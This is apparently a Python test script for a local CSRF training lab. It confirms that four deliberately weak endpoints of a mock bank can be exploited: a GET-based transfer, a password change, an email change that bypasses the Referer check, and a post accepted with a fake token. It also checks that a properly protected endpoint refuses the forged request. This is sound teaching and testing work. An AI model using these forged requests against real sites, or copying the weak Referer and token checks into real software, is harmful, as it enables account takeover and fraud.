# -*- coding: utf-8 -*-
"""验证 BankVault CSRF 靶场 4 个 FLAG 可解 + 安全点打不动"""
import requests

BANK = "http://127.0.0.1:5029"
EVIL = "http://127.0.0.1:5030"


def check_flags(s):
    r = s.get(BANK + "/")
    return {
        "flag1": "FLAG1 GET转账 ✅" in r.text,
        "flag2": "FLAG2 POST改密码 ✅" in r.text,
        "flag3": "FLAG3 绕Referer ✅" in r.text,
        "flag4": "FLAG4 假token发帖 ✅" in r.text,
    }


s = requests.Session()

# 重置 + 登录
s.get(BANK + "/reset")
r = s.post(BANK + "/login", data={"username": "admin", "password": "admin123"})
print("登录:", "成功" if "已登录" in r.text or r.status_code == 200 else "失败")
print("初始状态:", check_flags(s))
print()

# FLAG1 GET 转账（模拟攻击者 /get 页面的 img 标签：GET 请求带 cookie）
print("=== FLAG1 GET 转账 ===")
r = s.get(BANK + "/transfer", params={"to": "attacker", "amount": "1000"})
print("转账结果:", "FLAG1" if "FLAG1" in r.text else "未触发")
print()

# FLAG2 POST 改密码（模拟攻击者 /post 页面表单自动提交）
print("=== FLAG2 POST 改密码 ===")
r = s.post(BANK + "/change-password", data={"new_password": "hacked123"})
print("改密结果:", "FLAG2" if "FLAG2" in r.text else "未触发")
print()

# FLAG3 改邮箱：无 Referer（模拟 no-referrer）→ 放行
print("=== FLAG3 改邮箱（空 Referer 绕过）===")
r = s.post(BANK + "/change-email", data={"email": "attacker@evil.com"})
print("空Referer:", "FLAG3" if "FLAG3" in r.text else "未触发")
# 反向验证：带攻击者站点 Referer 应被拒
r2 = s.post(BANK + "/change-email", data={"email": "attacker@evil.com"},
            headers={"Referer": EVIL + "/referer"})
print("带evil Referer被拒:", "来源不合法" in r2.text)
print()

# FLAG4 发帖：假 token（服务器只检查存在）
print("=== FLAG4 假 token 发帖 ===")
r = s.post(BANK + "/post", data={"csrf_token": "x", "content": "csrfdemo-被借身份发帖"})
print("假token:", "FLAG4" if "FLAG4" in r.text else "未触发")
# 反向：缺 token 应被拒
r2 = s.post(BANK + "/post", data={"content": "csrfdemo"})
print("缺token被拒:", "CSRF 校验失败" in r2.text)
print()

# 安全点：改手机号真 token 校验，假 token 打不动
print("=== 安全对照 /settings ===")
r = s.post(BANK + "/settings", data={"csrf_token": "fake", "phone": "123"})
print("假token被拒:", "拒绝" in r.text)
print()

print("=== 最终 FLAG 状态 ===")
print(check_flags(s))
